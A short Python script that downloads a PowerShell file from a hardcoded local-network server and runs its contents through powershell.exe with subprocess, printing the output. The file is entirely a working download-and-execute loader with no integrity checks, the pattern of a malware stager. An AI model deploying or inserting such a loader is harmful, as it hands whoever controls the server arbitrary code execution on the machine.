import requests
import subprocess

server_ip = '192.168.203.154'  # Replace with the actual IP address of the server in your local network
port = 8000  # Replace with the actual port number

file_path = '/zzz.ps1'  # Replace with the actual file path on the server

url = f'http://{server_ip}:{port}/{file_path}'

response = requests.get(url)
if response.status_code == 200:
    powershell_command = response.text  # Read the PowerShell command from the file

    # Execute the PowerShell command using subprocess
    process = subprocess.Popen(["powershell.exe", powershell_command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()

    if process.returncode == 0:
        print("Command executed successfully.")
        print("Output:")
        print(output.decode('utf-8'))
    else:
        print("Command execution failed.")
        print("Error:")
        print(error.decode('utf-8'))
else:
    print(f"Failed to retrieve the file. Error code: {response.status_code}")
